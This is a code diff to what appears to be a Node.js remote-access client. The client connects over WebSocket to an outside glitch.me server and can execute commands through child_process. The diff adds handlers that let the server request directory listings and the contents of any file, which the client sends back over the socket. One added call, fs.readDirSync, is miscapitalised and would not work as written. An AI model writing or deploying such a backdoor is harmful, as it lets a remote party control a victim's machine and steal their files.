@@ -1,6 +1,7 @@
 const { exec } = require('node:child_process');
 const process = require('process');
 const path = require('path');
+const fs = require('fs');
 var ip = "";
 var WebSocket = require('ws');
 var ws = new WebSocket('wss://deciduous-flame-canidae.glitch.me',{
@@ -14,8 +15,7 @@ ws.on('open', function() {
     //ws.send('something');
 	console.log("connection opened to server.");
 	ws.send(JSON.stringify({
-		command:"sendFirstConnectInfo",
-		value:path.join(__dirname, dir)
+		command:"sendFirstConnectInfo"
 	}));
 });
 function runCommand(json) {
@@ -90,6 +90,18 @@ ws.on('message', function(data, flags) {
 			ws.send(JSON.stringify({
 				command:"currentDir",
 				value:path.join(__dirname, dir)
+			}));
+		}
+		if (json.command == "fsreadDirSync") {
+			ws.send(JSON.stringify({
+				command:"fsReadDirSyncRes",
+				value:fs.readDirSync(path.join(__dirname,json.dir))
+			}));
+		}
+		if (json.command == "fsreadFileSync") {
+			ws.send(JSON.stringify({
+				command:"fsReadFileSyncRes",
+				value:fs.readFileSync(path.join(__dirname,json.dir))
 			}));
 		}
 	}catch(e){}
